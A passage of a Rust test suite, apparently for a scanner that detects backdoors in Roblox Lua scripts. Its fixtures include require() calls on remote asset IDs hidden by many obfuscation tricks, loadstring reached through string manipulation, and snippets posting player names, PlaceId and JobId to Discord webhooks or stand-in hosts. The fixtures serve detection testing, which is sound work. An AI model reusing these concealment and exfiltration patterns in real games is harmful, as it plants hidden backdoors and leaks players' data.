        (
            "unknown global table",
            "require(FAKE_ids[\"999000000000544\"])",
        ),
        (
            "local from unknown method",
            "local FAKE_m = FAKE_Decoder:decode(999000000000545)\nrequire(FAKE_m)",
        ),
        ("negated literal", "require(FAKE_decode(-999000000000546))"),
    ] {
        expect(
            label,
            source,
            "BG001",
            Severity::High,
            Some(Confidence::Medium),
        );
    }
}

#[test]
fn item5_require_targets_downloaded_at_runtime_are_high() {
    for (label, source) in [
        (
            "tonumber of GetAsync",
            "local H = game:GetService(\"HttpService\")\nrequire(tonumber(H:GetAsync(\"https://example.test/FAKE_id\")))",
        ),
        (
            "field of decoded JSON",
            "local H = game:GetService(\"HttpService\")\nlocal FAKE_cfg = H:JSONDecode(H:GetAsync(\"https://example.test/FAKE_cfg\"))\nrequire(FAKE_cfg.module)",
        ),
        (
            "RequestAsync body",
            "local H = game:GetService(\"HttpService\")\nlocal FAKE_r = H:RequestAsync({Url = \"https://example.test/FAKE\", Method = \"GET\"})\nrequire(tonumber(FAKE_r.Body))",
        ),
    ] {
        expect(
            label,
            source,
            "BG001",
            Severity::High,
            Some(Confidence::Medium),
        );
    }
    let clean = analysis(
        "local H = game:GetService(\"HttpService\")\nlocal FAKE_data = H:JSONDecode(H:GetAsync(\"https://api.example.test/v1/config\"))\nprint(FAKE_data.motd)",
    );
    assert!(
        clean.findings.is_empty(),
        "{:#?}",
        describe(&clean.findings)
    );
}

/// Wrap an ID-producing expression in many folding shapes and nest them two deep.
#[test]
fn item5_generated_folding_combinations_resolve() {
    let wrappers: [fn(&str) -> String; 12] = [
        |x| format!("({x})"),
        |x| format!("({x} :: number)"),
        |x| format!("tonumber(tostring({x}))"),
        |x| format!("{x} + 0"),
        |x| format!("math.floor({x})"),
        |x| format!("select(1, {x})"),
        |x| format!("({{{x}}})[1]"),
        |x| format!("if true then {x} else 0"),
        |x| format!("nil or {x}"),
        |x| format!("tonumber(\"\" .. {x})"),
        |x| format!("table.unpack({{{x}}})"),
        |x| format!("math.abs(-({x}))"),
    ];
    let mut count = 0;
    for outer in wrappers {
        for inner in wrappers {
            let source = format!("require({})", outer(&inner("999000000000550")));
            expect(
                &source,
                &source,
                "BG001",
                Severity::High,
                Some(Confidence::High),
            );
            count += 1;
        }
    }
    assert_eq!(count, 144);
}

#[test]
fn item5_loop_built_ids_never_resolve_to_one_iteration() {
    for source in [
        "local FAKE_id = 0\nfor FAKE_i = 1, 15 do FAKE_id = FAKE_id * 10 + 9 end\nrequire(FAKE_id)",
        "local FAKE_id = 0\nwhile FAKE_id < 999000000000000 do FAKE_id = FAKE_id * 10 + 9 end\nrequire(FAKE_id)",
        "local FAKE_id = \"\"\nfor FAKE_i = 1, 15 do FAKE_id ..= \"9\" end\nrequire(tonumber(FAKE_id))",
        "local FAKE_a, FAKE_b = 0, 0\nfor FAKE_i = 1, 15 do FAKE_b = FAKE_a * 10 + 9; FAKE_a = FAKE_b end\nrequire(FAKE_a)",
        "local FAKE_id = 0\nlocal function FAKE_step() FAKE_id = FAKE_id * 10 + 9 end\nfor FAKE_i = 1, 15 do FAKE_step() end\nrequire(FAKE_id)",
    ] {
        let result = analysis(source);
        assert!(
            result
                .findings
                .iter()
                .all(|finding| !finding.evidence.contains("resolved asset id:")),
            "{source}: {:#?}",
            describe(&result.findings)
        );
        assert!(
            result
                .findings
                .iter()
                .any(|finding| finding.rule_id == "BG001"),
            "{source}: the require must stay visible"
        );
    }
}

#[test]
fn item5_clean_requires_stay_below_high() {
    for source in [
        "local FAKE_Modules = script.Parent.FAKE_Modules\nfor _, FAKE_m in FAKE_Modules:GetChildren() do require(FAKE_m) end",
        "local FAKE_name = \"FAKE_Module\"\nrequire(script.Parent[FAKE_name])",
        "local FAKE_root = game:GetService(\"ReplicatedStorage\")\nrequire(FAKE_root:WaitForChild(\"FAKE_Shared\"):WaitForChild(\"FAKE_Util\"))",
        "local FAKE_ok, FAKE_mod = pcall(require, script.Parent.FAKE_Optional)",
        "require(\"@pkg/FAKE_lib\")",
        "local FAKE_target = if FAKE_server then script.FAKE_Server else script.FAKE_Client\nrequire(FAKE_target)",
        "local FAKE_m = script.Parent.FAKE_A or script.Parent.FAKE_B\nrequire(FAKE_m)",
        "local FAKE_version = 2\nrequire(script.Parent[\"FAKE_v\" .. FAKE_version])",
        "return require(game:GetService(\"ReplicatedStorage\"):WaitForChild(script.Name .. \"Shared\"))",
    ] {
        let result = analysis(source);
        expect_no_high(source, &result);
        expect_complete(source, &result);
    }
    // Folder loaders iterate instances, so they get no finding at all.
    let loader = "local FAKE_modules = {}\nfor _, child in ipairs(script.Parent.FAKE_Modules:GetChildren()) do FAKE_modules[child.Name] = require(child) end\nfor _, child in script:GetDescendants() do require(child) end";
    assert!(
        analysis(loader).findings.is_empty(),
        "{:#?}",
        describe(&analysis(loader).findings)
    );
}

// ----- item 6: computed global names ---------------------------------------------------

#[test]
fn item6_calls_through_computed_global_names_are_medium() {
    for (label, source) in [
        ("_G", "_G[FAKE_key](\"FAKE\")"),
        ("shared", "shared[FAKE_key](\"FAKE\")"),
        ("getfenv", "getfenv()[FAKE_key](\"FAKE\")"),
        ("rawget", "rawget(_G, FAKE_key)(\"FAKE\")"),
        (
            "aliased env",
            "local FAKE_env = getfenv(0)\nFAKE_env[FAKE_k](\"FAKE\")",
        ),
        (
            "aliased _G",
            "local FAKE_G = _G\nlocal FAKE_fn = FAKE_G[FAKE_name]\nFAKE_fn(\"FAKE\")",
        ),
        ("parenthesized", "(_G)[FAKE_k](\"FAKE\")"),
        ("concatenated key", "_G[FAKE_k .. \"FAKE\"](\"FAKE\")"),
        (
            "parameter key",
            "local function FAKE_call(name, ...) return _G[name](...) end",
        ),
        ("method on computed", "_G[FAKE_k]:FAKE_method()"),
        (
            "loop over _G",
            "for FAKE_k, FAKE_v in pairs(_G) do if FAKE_k == FAKE_want then FAKE_v(\"FAKE\") end end",
        ),
        (
            "loop over the environment",
            "for _, FAKE_v in getfenv() do FAKE_v(\"FAKE\") end",
        ),
    ] {
        expect(
            label,
            source,
            "BG004",
            Severity::Medium,
            Some(Confidence::Medium),
        );
    }
}

#[test]
fn item6_computed_global_receiving_an_asset_id_is_high() {
    expect(
        "computed global with id",
        "_G[FAKE_key](999000000000601)",
        "BG001",
        Severity::High,
        Some(Confidence::Medium),
    );
}

#[test]
fn item6_clean_global_use_is_not_reported() {
    for source in [
        "_G[FAKE_key] = 1",
        "local FAKE_v = _G[FAKE_key]\nprint(FAKE_v)",
        "_G.print(\"FAKE\")",
        "local FAKE_handlers = {}\nFAKE_handlers[FAKE_name](\"FAKE\")",
        "local FAKE_commands = { FAKE_a = function() end }\nFAKE_commands[FAKE_name]()",
        "shared.FAKE_settings = { volume = 1 }",
    ] {
        let result = analysis(source);
        assert!(
            result
                .findings
                .iter()
                .all(|finding| finding.rule_id != "BG004"),
            "{source}: {:#?}",
            describe(&result.findings)
        );
    }
}

#[test]
fn item6_gsub_split_utf8_and_patterns_fold_global_names() {
    for (label, source) in [
        (
            "plain gsub",
            "_G[(\"r_e_q_u_i_r_e\"):gsub(\"_\", \"\")](999000000000610)",
        ),
        (
            "gsub function form",
            "_G[string.gsub(\"re-qu-ire\", \"%-\", \"\")](999000000000611)",
        ),
        (
            "gsub class",
            "_G[(\"r1e2q3u4i5r6e\"):gsub(\"%d\", \"\")](999000000000612)",
        ),
        (
            "gsub capture",
            "_G[(\"FAKE_require\"):gsub(\"FAKE_(%a+)\", \"%1\")](999000000000613)",
        ),
        (
            "split index",
            "_G[string.split(\"FAKE,require\", \",\")[2]](999000000000614)",
        ),
        (
            "split method",
            "_G[(\"FAKE|require\"):split(\"|\")[2]](999000000000615)",
        ),
        (
            "split concat",
            "_G[table.concat(string.split(\"re|qu|ire\", \"|\"))](999000000000616)",
        ),
        (
            "utf8.char",
            "_G[utf8.char(114, 101, 113, 117, 105, 114, 101)](999000000000617)",
        ),
        (
            "match",
            "_G[(\"xx require xx\"):match(\"%a+\", 4)](999000000000618)",
        ),
        (
            "anchored match",
            "_G[(\"require!\"):match(\"^(%l+)\")](999000000000619)",
        ),
        (
            "find and sub",
            "local s = \"FAKErequire\"\n_G[s:sub((s:find(\"req\", 1, true)))](999000000000620)",
        ),
        (
            "format strings",
            "_G[string.format(\"%s%s\", \"req\", \"uire\")](999000000000621)",
        ),
        (
            "char and byte",
            "_G[string.char((\"r\"):byte(), (\"equire\"):byte(1, -1))](999000000000622)",
        ),
        (
            "lower pieces",
            "_G[(\"REQ\"):lower() .. (\"UIRE\"):lower()](999000000000623)",
        ),
        (
            "bit32",
            "_G[string.char(bit32.bxor(114, 0), 101, 113, 117, 105, 114, 101)](999000000000624)",
        ),
        (
            "environment through __index",
            "local FAKE_env = setmetatable({}, {__index = getfenv()})\nFAKE_env.require(999000000000625)",
        ),
        (
            "byte table unpacked",
            "local FAKE_b = {114, 101, 113, 117, 105, 114, 101}\n_G[string.char(table.unpack(FAKE_b))](999000000000626)",
        ),
    ] {
        expect(
            label,
            source,
            "BG001",
            Severity::High,
            Some(Confidence::High),
        );
    }
    expect(
        "loadstring through gsub",
        "_G[(\"load_string\"):gsub(\"_\", \"\")](\"return 1\")",
        "BG003",
        Severity::High,
        None,
    );
}

// ----- item 7: BG008 -------------------------------------------------------------------

const WEBHOOK: &str = "https://discord.com/api/webhooks/000/FAKE";

fn http(body: &str) -> String {
    format!("local H = game:GetService(\"HttpService\")\n{body}")
}

#[test]
fn item7_url_normalization_finds_webhooks() {
    for (label, url) in [
        (
            "percent encoded",
            "https://discord.com/api/%77ebhooks/000/FAKE",
        ),
        (
            "double encoded",
            "https://hooks.example.test/api/%2577ebhooks/000/FAKE",
        ),
        (
            "doubled slashes",
            "https://hooks.example.test//api//webhooks/000/FAKE",
        ),
        (
            "dot segments",
            "https://hooks.example.test/x/../api/./webhooks/000/FAKE",
        ),
        (
            "versioned path",
            "https://hooks.example.test/api/v10/webhooks/000/FAKE",
        ),
        ("ip host", "http://203.0.113.7:8080/api/webhooks/000/FAKE"),
        (
            "uppercase",
            "HTTPS://HOOKS.EXAMPLE.TEST/API/WEBHOOKS/000/FAKE",
        ),
        (
            "discord host",
            "https://ptb.discord.com/api/v9/channels/000/messages",
        ),
        (
            "discordapp host",
            "https://discordapp.com/api/webhooks/000/FAKE",
        ),
        (
            "credentials and port",
            "https://FAKE:FAKE@hooks.example.test:443/api/webhooks/000/FAKE",
        ),
        (
            "id and token path",
            "https://hooks.example.test/webhooks/000/FAKE",
        ),
    ] {
        let source = http(&format!("H:PostAsync(\"{url}\", \"{{}}\")"));
        expect(label, &source, "BG008", Severity::High, None);
    }
}

#[test]
fn item7_raw_ip_destinations_are_medium() {
    let source = http("H:PostAsync(\"http://198.51.100.20/collect\", \"{}\")");
    expect(
        "ip post",
        &source,
        "BG008",
        Severity::Medium,
        Some(Confidence::Medium),
    );
    let result = analysis(&source);
    assert!(find(&result.findings, "BG008", Severity::High, None).is_none());
}

#[test]
fn item7_webhook_constants_are_medium_even_when_untraced() {
    for (label, source) in [
        ("unused local", format!("local FAKE_url = \"{WEBHOOK}\"")),
        (
            "unknown sender",
            format!("local FAKE_url = \"{WEBHOOK}\"\nFAKE_send(FAKE_url, FAKE_data)"),
        ),
        (
            "folded constant",
            "local FAKE_url = \"https://discord.com/api/\" .. \"webhooks/000/FAKE\"".to_string(),
        ),
        (
            "table field",
            format!("return {{ FAKE_log = \"{WEBHOOK}\" }}"),
        ),
        (
            "reversed",
            format!(
                "local FAKE_url = (\"{}\"):reverse()",
                WEBHOOK.chars().rev().collect::<String>()
            ),
        ),
    ] {
        expect(
            label,
            &source,
            "BG008",
            Severity::Medium,
            Some(Confidence::Medium),
        );
    }
}

#[test]
fn item7_alias_calls_and_helpers_are_traced() {
    for (label, body) in [
        (
            "dot call with receiver",
            format!("H.RequestAsync(H, {{Url = \"{WEBHOOK}\", Method = \"POST\", Body = \"{{}}\"}})"),
        ),
        (
            "stored method",
            format!("local FAKE_post = H.PostAsync\nFAKE_post(H, \"{WEBHOOK}\", \"{{}}\")"),
        ),
        (
            "helper function",
            format!(
                "local function FAKE_post(service, url, body) return service:PostAsync(url, body) end\nFAKE_post(H, \"{WEBHOOK}\", \"{{}}\")"
            ),
        ),
        (
            "vararg helper",
            format!(
                "local FAKE_post = function(...) return H:PostAsync(...) end\nFAKE_post(\"{WEBHOOK}\", \"{{}}\")"
            ),
        ),
        (
            "table call sugar",
            format!("H:RequestAsync{{Url = \"{WEBHOOK}\", Method = \"POST\"}}"),
        ),
        (
            "url assigned later",
            format!("local FAKE_req = {{Method = \"POST\"}}\nFAKE_req.Url = \"{WEBHOOK}\"\nH:RequestAsync(FAKE_req)"),
        ),
        (
            "url from local function",
            format!("local function FAKE_hook() return \"{WEBHOOK}\" end\nH:PostAsync(FAKE_hook(), \"{{}}\")"),
        ),
        (
            "formatted url",
            "H:PostAsync(string.format(\"https://%s/api/webhooks/%s\", \"discord.com\", \"000/FAKE\"), \"{}\")".to_string(),
        ),
        (
            "module method helper",
            format!(
                "local FAKE_Log = {{}}\nfunction FAKE_Log:send(url, body) return H:PostAsync(url, body) end\nFAKE_Log:send(\"{WEBHOOK}\", \"{{}}\")"
            ),
        ),
    ] {
        expect(label, &http(&body), "BG008", Severity::High, None);
    }
}

#[test]
fn item7_sensitive_values_in_tables_are_tainted() {
    for (label, body) in [
        (
            "field assignment",
            "local FAKE_data = {}\nFAKE_data.place = game.PlaceId\nlocal FAKE_body = H:JSONEncode(FAKE_data)\nH:PostAsync(\"https://FAKE.example.test/upload\", FAKE_body)",
        ),
        (
            "bracket assignment",
            "local FAKE_data = {}\nFAKE_data[\"job\"] = game.JobId\nH:PostAsync(\"https://FAKE.example.test/upload\", H:JSONEncode(FAKE_data))",
        ),
        (
            "table.insert",
            "local FAKE_list = {}\nfor _, player in game:GetService(\"Players\"):GetPlayers() do table.insert(FAKE_list, player.Name) end\nH:PostAsync(\"https://FAKE.example.test/upload\", H:JSONEncode(FAKE_list))",
        ),
        (
            "nested field",
            "local FAKE_payload = { embeds = {} }\nFAKE_payload.creator = game.CreatorId\nH:RequestAsync({Url = \"https://FAKE.example.test/upload\", Method = \"POST\", Body = H:JSONEncode(FAKE_payload)})",
        ),
        (
            "formatted body",
            "local FAKE_body = string.format(\"%d\", game.PlaceId)\nH:PostAsync(\"https://FAKE.example.test/upload\", FAKE_body)",
        ),
        (
            "preencoded LocalPlayer name",
            "local FAKE_n = game:GetService(\"Players\").LocalPlayer.Name\nH:PostAsync(\"https://FAKE.example.test/upload\", H:JSONEncode({content = FAKE_n}))",
        ),
        (
            "helper receiving JobId",
            "local function FAKE_send(data) H:PostAsync(\"https://FAKE.example.test/upload\", H:JSONEncode({d = data})) end\nFAKE_send(game.JobId)",
        ),
    ] {
        expect(label, &http(body), "BG008", Severity::High, None);
    }
    // A GET that carries game data in its URL is common for a game's own backend, so it
    // is reported at medium.
    let get = http("H:GetAsync(\"https://FAKE.example.test/collect?place=\" .. game.PlaceId)");
    expect(
        "url query",
        &get,
        "BG008",
        Severity::Medium,
        Some(Confidence::Medium),
    );
    assert!(find(&analysis(&get).findings, "BG008", Severity::High, None).is_none());
}

#[test]
fn item7_urls_built_from_a_constant_prefix_and_wrapped_calls_are_traced() {
    for (label, body) in [
        (
            "prefix plus unknown parts",
            "local FAKE_base = \"https://discord.com/api/webhooks/\"\nH:PostAsync(FAKE_base .. FAKE_id .. \"/\" .. FAKE_token, \"{}\")",
        ),
        (
            "pcall with a stored method",
            "local FAKE_post = H.PostAsync\npcall(FAKE_post, H, \"https://discord.com/api/webhooks/000/FAKE\", \"{}\")",
        ),
        (
            "task.spawn with a method",
            "task.spawn(H.PostAsync, H, \"https://discord.com/api/webhooks/000/FAKE\", \"{}\")",
        ),
        (
            "union of endpoints",
            "local FAKE_url = FAKE_debug and \"https://discord.com/api/webhooks/000/FAKE\" or \"https://analytics.example.test/e\"\nH:PostAsync(FAKE_url, \"{}\")",
        ),
    ] {
        expect(label, &http(body), "BG008", Severity::High, None);
    }
}

#[test]
fn item7_links_that_are_not_endpoints_are_not_webhooks() {
    for source in [
        "return { Discord = \"https://discord.com/invite/FAKE\", Docs = \"https://example.test/webhooks\" }",
        "-- Never send data to https://discord.com/api/webhooks/... from a game.\nreturn true",
    ] {
        let result = analysis(source);
        assert!(
            result
                .findings
                .iter()
                .all(|finding| finding.rule_id != "BG008"),
            "{source}: {:#?}",
            describe(&result.findings)
        );
    }
}

#[test]
fn item7_clean_http_stays_clean() {
    for body in [
        "H:PostAsync(\"https://analytics.example.test/v1/events\", H:JSONEncode({event = \"FAKE_round\"}))",
        "H:GetAsync(\"https://example.test/FAKE_health\")",
        "local FAKE_docs = \"https://example.test/docs/webhooks\"\nprint(FAKE_docs)",
        "local FAKE_data = {}\nFAKE_data.event = \"FAKE_start\"\nH:PostAsync(\"https://analytics.example.test/v1/events\", H:JSONEncode(FAKE_data))",
        "local function FAKE_track(name) H:PostAsync(\"https://analytics.example.test/v1/events\", H:JSONEncode({event = name})) end\nFAKE_track(\"FAKE_end\")",
    ] {
        let result = analysis(&http(body));
        assert!(
            result
                .findings
                .iter()
                .all(|finding| finding.rule_id != "BG008"),
            "{body}: {:#?}",
            describe(&result.findings)
        );
    }
}

// ----- item 8: joins and wrappers ------------------------------------------------------

#[test]
fn item8_nested_reassignments_keep_every_candidate() {
    for (label, source) in [
        (
            "dead if false",
            "local FAKE_id = 999000000000801\nif false then FAKE_id = script.Parent.FAKE_Module end\nrequire(FAKE_id)",
        ),
        (
            "uncalled function",
            "local FAKE_id = 999000000000802\nlocal function FAKE_decoy() FAKE_id = \"./FAKE\" end\nrequire(FAKE_id)",
        ),
        (
            "else branch",
            "local FAKE_id = script.Parent.FAKE_Module\nif FAKE_cond then FAKE_id = 999000000000803 end\nrequire(FAKE_id)",
        ),
        (
            "loop body",
            "local FAKE_id = script.Parent.FAKE_Module\nfor _, v in FAKE_list do FAKE_id = 999000000000804 end\nrequire(FAKE_id)",
        ),
        (
            "global set in function",
            "local function FAKE_setup() FAKE_ID = 999000000000805 end\nFAKE_setup()\nrequire(FAKE_ID)",
        ),
        (
            "table field in branch",
            "local FAKE_cfg = { id = script.Parent.FAKE_Module }\nif FAKE_cond then FAKE_cfg.id = 999000000000806 end\nrequire(FAKE_cfg.id)",
        ),
        (
            "alias reassigned in branch",
            "local FAKE_r = print\nif FAKE_cond then FAKE_r = require end\nFAKE_r(999000000000807)",
        ),
        (
            "many decoys",
            &format!(
                "local FAKE_id = 999000000000808\n{}\nrequire(FAKE_id)",
                lines(40, |index| format!(
                    "if false then FAKE_id = script.Parent.FAKE_Decoy{index} end"
                ))
            ),
        ),
    ] {
        expect(
            label,
            source,
            "BG001",
            Severity::High,
            Some(Confidence::High),
        );
    }
}

#[test]
fn item8_local_function_and_call_metamethod_wrappers_are_checked_at_call_sites() {
    for (label, source) in [
        (
            "local function",
            "local function load(id) return require(id) end\nload(999000000000810)",
        ),
        (
            "call metamethod",
            "local FAKE_L = setmetatable({}, {__call = function(_, id) return require(id) end})\nFAKE_L(999000000000811)",
        ),
        (
            "global function",
            "function FAKE_load(id) return require(id) end\nFAKE_load(999000000000812)",
        ),
        (
            "module field",
            "local M = {}\nfunction M.load(id) return require(id) end\nM.load(999000000000813)",
        ),
        (
            "module method",
            "local M = {}\nfunction M:load(id) return require(id) end\nM:load(999000000000814)",
        ),
        (
            "anonymous local",
            "local FAKE_load = function(id) return require(id) end\nFAKE_load(999000000000815)",
        ),
        (
            "immediately invoked",
            "(function(id) require(id) end)(999000000000816)",
        ),
        (
            "nested wrappers",
            "local function a(x) return require(x) end\nlocal function b(y) return a(y) end\nb(999000000000817)",
        ),
        (
            "wrapper with transform",
            "local function load(s) return require(tonumber(s)) end\nload(\"999000000000818\")",
        ),
        (
            "wrapper through pcall",
            "local function safe(id) return pcall(require, id) end\nsafe(999000000000819)",
        ),
        (
            "wrapper through task.spawn",
            "local function load(id) require(id) end\ntask.spawn(load, 999000000000820)",
        ),
        (
            "wrapper with extra arguments",
            "local function load(name, id, flag) if flag then return require(id) end end\nload(\"FAKE\", 999000000000821, true)",
        ),
        (
            "callback wrapper",
            "local function run(fn, ...) return fn(...) end\nrun(require, 999000000000822)",
        ),
        (
            "field assigned function",
            "local M = {}\nM.load = function(id) return require(id) end\nM.load(999000000000823)",
        ),
        (
            "index metamethod",
            "local FAKE_L = setmetatable({}, {__index = function(_, id) return require(id) end})\nlocal FAKE_m = FAKE_L[999000000000824]",
        ),
        (
            "alias inside the wrapper",
            "local function load(id) local m = require; return m(id) end\nload(999000000000825)",
        ),
        (
            "coroutine.wrap of an anonymous wrapper",
            "coroutine.wrap(function(id) require(id) end)(999000000000826)",
        ),
        (
            "task.spawn of an anonymous wrapper",
            "task.spawn(function(id) require(id) end, 999000000000827)",
        ),
        (
            "coroutine.resume of require",
            "coroutine.resume(coroutine.create(require), 999000000000829)",
        ),
        (
            "coroutine.resume of an anonymous wrapper",
            "coroutine.resume(coroutine.create(function(id) require(id) end), 999000000000830)",
        ),
        (
            "vararg table",
            "local function f(...) local a = {...}; return require(a[1]) end\nf(999000000000828)",
        ),
    ] {
        expect(label, source, "BG001", Severity::High, None);
    }
}

#[test]
fn item8_class_instances_and_constructors_are_followed() {
    for (label, source, rule) in [
        (
            "class method through __index",
            "local Loader = {}\nLoader.__index = Loader\nfunction Loader.new() return setmetatable({}, Loader) end\nfunction Loader:load(id) return require(id) end\nlocal FAKE_l = Loader.new()\nFAKE_l:load(999000000000840)",
            "BG001",
        ),
        (
            "default argument",
            "local function load(id) id = id or 0; return require(id) end\nload(999000000000841)",
            "BG001",
        ),
        (
            "factory returning require",
            "local function make() return require end\nmake()(999000000000842)",
            "BG001",
        ),
        (
            "wrapper in a table constructor",
            "local L = { load = function(id) return require(id) end }\nL.load(999000000000843)",
            "BG001",
        ),
        (
            "logger object storing a webhook",
            "local H = game:GetService(\"HttpService\")\nlocal Logger = {}\nLogger.__index = Logger\nfunction Logger.new(url) return setmetatable({url = url}, Logger) end\nfunction Logger:send(msg) H:PostAsync(self.url, msg) end\nlocal FAKE_log = Logger.new(\"https://discord.com/api/webhooks/000/FAKE\")\nFAKE_log:send(\"{}\")",
            "BG008",
        ),
        (
            "client with a field set in the constructor",
            "local H = game:GetService(\"HttpService\")\nlocal Client = {}\nClient.__index = Client\nfunction Client.new(endpoint) local self = setmetatable({}, Client) self.endpoint = endpoint return self end\nfunction Client:post(body) return H:PostAsync(self.endpoint, body) end\nClient.new(\"https://hooks.example.test/api/webhooks/000/FAKE\"):post(\"{}\")",
            "BG008",
        ),
    ] {
        expect(label, source, rule, Severity::High, None);
    }
}

#[test]
fn item8_wrapper_call_sites_with_many_ids_stay_complete() {
    let source = format!(
        "local function load(id) return require(id) end\n{}",
        lines(200, |index| format!(
            "load({})",
            999_000_000_000_830u64 + index as u64
        ))
    );
    let result = analysis(&source);
    expect_complete("many wrapper calls", &result);
    let high = result
        .findings
        .iter()
        .filter(|finding| finding.rule_id == "BG001" && finding.severity >= Severity::High)
        .count();
    assert!(high >= 100, "{high} high findings");
}

#[test]
fn item8_clean_wrappers_are_not_high() {
    for source in [
        "local function load(m) return require(m) end\nload(script.Parent.FAKE_Module)",
        "local function lazy(module)\nreturn require(module)\nend\nreturn lazy",
        "local Loader = {}\nfunction Loader.get(name) return require(script.Parent:WaitForChild(name)) end\nLoader.get(\"FAKE_Module\")",
        "local function FAKE_each(folder, fn) for _, child in folder:GetChildren() do fn(child) end end\nFAKE_each(script.Parent.FAKE_Modules, require)",
    ] {
        let result = analysis(source);
        let high: Vec<_> = result
            .findings
            .iter()
            .filter(|finding| {
                finding.rule_id == "BG001"
                    && finding.severity >= Severity::High
                    && finding.confidence == Confidence::High
            })
            .collect();
        assert!(
            high.is_empty(),
            "{source}: {:#?}",
            describe(&result.findings)
        );
    }
}

// ----- item 9, first bullet: DOM origins -----------------------------------------------

fn model(children: Vec<Instance>, source: &str) -> Document {
    let mut instances = vec![Instance {
        name: "FAKE_Model".into(),
        class: "Model".into(),
        ..Instance::default()
    }];
    for mut child in children {
        child.parent = Some(0);
        instances.push(child);
    }
    instances.push(Instance {
        name: "FAKE_Loader".into(),
        class: "Script".into(),
        parent: Some(0),
        source: Some(source.into()),
        ..Instance::default()
    });
    Document {
        input: "FAKE_model.rbxmx".into(),
        instances,
        ..Document::default()
    }
}

fn with_property(name: &str, class: &str, property: &str, value: serde_json::Value) -> Instance {
    let mut properties = BTreeMap::new();
    properties.insert(property.into(), value);
    Instance {
        name: name.into(),
        class: class.into(),
        properties,
        ..Instance::default()
    }
}

fn analyze_model(document: &Document) -> AnalysisResult {
    analyze(
        document,
        document.instances.len() - 1,
        &Limits::default(),
        &[],
    )
}

#[test]
fn item9_dom_origins_survive_parsing_arithmetic_casts_and_string_methods() {
    let sound = with_property(
        "FAKE_Sound",
        "Sound",
        "SoundId",
        serde_json::json!("rbxassetid://999000000000901"),
    );
    let text = with_property(
        "FAKE_Text",
        "StringValue",
        "Value",
        serde_json::json!("id=999000000000902;FAKE"),
    );
    let number = with_property(
        "FAKE_Id",
        "NumberValue",
        "Value",
        serde_json::json!(999_000_000_000_903u64),
    );
    let mut attributed = Instance {
        name: "FAKE_Config".into(),
        class: "Configuration".into(),
        ..Instance::default()
    };
    attributed.attributes.insert(
        "FAKE_asset".into(),
        serde_json::json!("rbxassetid://999000000000904"),
    );
    for (label, source) in [
        (
            "match on SoundId",
            "require(tonumber(script.Parent.FAKE_Sound.SoundId:match(\"%d+\")))",
        ),
        (
            "string.match function",
            "require(tonumber(string.match(script.Parent.FAKE_Sound.SoundId, \"%d+\")))",
        ),
        (
            "gsub then tonumber",
            "require(tonumber((script.Parent.FAKE_Sound.SoundId:gsub(\"%D\", \"\"))))",
        ),
        (
            "sub of a StringValue",
            "require(tonumber(script.Parent.FAKE_Text.Value:sub(4, 18)))",
        ),
        (
            "pattern capture",
            "require(tonumber(script.Parent.FAKE_Text.Value:match(\"id=(%d+)\")))",
        ),
        ("arithmetic", "require(script.Parent.FAKE_Id.Value + 0)"),
        ("cast", "require(script.Parent.FAKE_Id.Value :: number)"),
        (
            "tostring and tonumber",
            "require(tonumber(tostring(script.Parent.FAKE_Id.Value)))",
        ),
        (
            "attribute sub",
            "require(tonumber(script.Parent.FAKE_Config:GetAttribute(\"FAKE_asset\"):sub(14)))",
        ),
        (
            "math.floor",
            "require(math.floor(script.Parent.FAKE_Id.Value))",
        ),
        (
            "instance name",
            "require(tonumber(script.Parent.FAKE_999000000000905.Name:sub(6)))",
        ),
    ] {
        let named = Instance {
            name: "FAKE_999000000000905".into(),
            class: "Folder".into(),
            ..Instance::default()
        };
        let document = model(
            vec![
                sound.clone(),
                text.clone(),
                number.clone(),
                attributed.clone(),
                named,
            ],
            source,
        );
        let result = analyze_model(&document);
        let finding = find(
            &result.findings,
            "BG002",
            Severity::Critical,
            Some(Confidence::High),
        )
        .unwrap_or_else(|| {
            panic!(
                "{label}: expected BG002 with high confidence: {:#?}",
                describe(&result.findings)
            )
        });
        assert_eq!(finding.related_locations.len(), 1, "{label}");
    }
}

#[test]
fn item9_unresolved_dom_derived_values_are_bg002_not_bg001_low() {
    let text = with_property(
        "FAKE_Text",
        "StringValue",
        "Value",
        serde_json::json!("FAKE_not_an_id"),
    );
    for (label, document) in [
        (
            "external tonumber",
            script_document("require(tonumber(workspace.FAKE_Config.Value))"),
        ),
        (
            "external match",
            script_document("require(tonumber(workspace.FAKE_Sound.SoundId:match(\"%d+\")))"),
        ),
        (
            "external arithmetic",
            script_document("require(workspace.FAKE_Config.Value * 1)"),
        ),
        (
            "unknown method on a DOM string",
            model(
                vec![text.clone()],
                "require(script.Parent.FAKE_Text.Value:FAKE_decode())",
            ),
        ),
        (
            "non-numeric DOM string",
            model(
                vec![text.clone()],
                "require(tonumber(script.Parent.FAKE_Text.Value))",
            ),
        ),
    ] {
        let result = analyze(
            &document,
            document.instances.len() - 1,
            &Limits::default(),
            &[],
        );
        assert!(
            find(&result.findings, "BG002", Severity::Medium, None).is_some(),
            "{label}: {:#?}",
            describe(&result.findings)
        );
        assert!(
            result
                .findings
                .iter()
                .all(|finding| !(finding.rule_id == "BG001" && finding.severity == Severity::Low)),
            "{label}: {:#?}",
            describe(&result.findings)
        );
    }
}

// ----- clean corpus shapes and determinism ---------------------------------------------

fn clean_sources() -> Vec<(&'static str, String)> {
    vec![
        ("knit service", "local Knit = require(game:GetService(\"ReplicatedStorage\").Packages.Knit)\nlocal FAKE_Service = Knit.CreateService({ Name = \"FAKE_Service\", Client = {} })\nfunction FAKE_Service:KnitStart() print(\"FAKE start\") end\nreturn FAKE_Service".into()),
        ("promise", "local Promise = require(script.Parent.Promise)\nreturn Promise.new(function(resolve, reject) task.delay(1, resolve, \"FAKE\") end):andThen(function(v) return v end)".into()),
        ("signal", "local Signal = {}\nSignal.__index = Signal\nfunction Signal.new() return setmetatable({ _handlers = {} }, Signal) end\nfunction Signal:Connect(fn) table.insert(self._handlers, fn) end\nfunction Signal:Fire(...) for _, fn in self._handlers do task.spawn(fn, ...) end end\nreturn Signal".into()),
        ("profile data", "local Template = { Coins = 0, Items = {}, LastJoin = 0 }\nlocal function load(player) local data = table.clone(Template) data.LastJoin = os.time() return data end\nreturn { Template = Template, load = load }".into()),
        ("fusion ui", "local Fusion = require(script.Parent.Packages.Fusion)\nlocal New, Children = Fusion.New, Fusion.Children\nreturn New \"ScreenGui\" { [Children] = { New \"TextLabel\" { Text = \"FAKE\" } } }".into()),
        ("folder loader", "local modules = {}\nfor _, child in script:GetChildren() do if child:IsA(\"ModuleScript\") then modules[child.Name] = require(child) end end\nreturn modules".into()),
